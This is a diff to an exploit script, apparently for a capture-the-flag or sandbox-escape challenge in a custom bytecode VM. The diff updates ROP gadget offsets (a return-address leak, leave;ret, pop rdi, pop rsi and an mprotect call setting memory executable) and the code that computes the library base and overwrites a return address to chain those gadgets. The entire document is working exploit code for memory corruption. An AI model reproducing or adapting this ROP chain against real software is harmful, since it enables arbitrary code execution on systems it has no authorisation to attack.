@@ -1,10 +1,10 @@
 /*
 Gadgets:
-0x233a: ret leak
-0x2b21: leave; ret;
-0x2b51: mprotect(_, _, PROT_READ | PROT_EXEC); (5*8 load)
-0x2472: pop rdi; ret;
-0x228f: pop rsi; ret;
+0x234a: ret leak
+0x2c11: leave; ret;
+0x2c41: mprotect(_, _, PROT_READ | PROT_EXEC); (5*8 load)
+0x2482: pop rdi; ret;
+0x2293: pop rsi; ret;
 
 ASSUMING: all address arithmetic doesn't cross (1<<32) address boundary
 */
@@ -25,7 +25,7 @@ function entry(args: 2, ret: 1, locals: 6) {
     // ret leak hi
     local.set 4 // librp2sm base hi
     // ret leak lo
-    li 0x233a
+    li 0x234a
     sub
     local.set 5 // librp2sm base lo
 
@@ -41,15 +41,15 @@ function entry(args: 2, ret: 1, locals: 6) {
 
     local.get 5 // librp2sm base lo
     dup; dup
-    li 0x2b51 // mprotect
+    li 0x2c41 // mprotect
     add
     li mprot_lo
     mem.sw
-    li 0x2472 // pop rdi
+    li 0x2482 // pop rdi
     add
     li poprdi_lo
     mem.sw
-    li 0x228f // pop rsi
+    li 0x2293 // pop rsi
     add
     li poprsi_lo
     mem.sw
@@ -76,7 +76,7 @@ function entry(args: 2, ret: 1, locals: 6) {
 
     drop // remove spacer
     local.get 5 // librp2sm base lo
-    li 0x2b21
+    li 0x2c11
     add
     call writer1 // ret addr lo
     local.get 4 // librp2sm base hi
